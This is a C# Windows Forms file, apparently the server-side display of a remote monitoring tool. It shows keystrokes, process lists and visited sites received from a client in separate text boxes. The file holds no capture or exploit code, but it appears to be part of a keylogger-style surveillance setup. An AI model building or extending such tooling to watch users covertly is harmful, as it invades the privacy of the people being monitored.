using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ServerSide
{
    public partial class CurrentState : Form
    {
        
        public CurrentState()
        {                 
            InitializeComponent();
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            txbProcesses.Text = "";
            getID handler = Client.sendID;
            handler();
            this.Close();
        }

        private void CurrentState_Load(object sender, EventArgs e)
        {
            
        }
        public void addText(string str)
        {
            string[] add = str.Split(new[] { '\r', '\0' }, 2);
            if (add.Length >= 2) {
                string data = add[1].Split(new[] { '\0' }, 2)[0];
                Invoke((Action)delegate
                {
                    if (add[0] == "keyBoard")
                        txbTyped.AppendText(data + " ");
                    if (add[0] == "processes")
                        txbProcesses.AppendText(data);
                    if (add[0] == "site")
                        txbSites.AppendText(data + "\n");
                });
            }
           
            
        }

        
    }
}
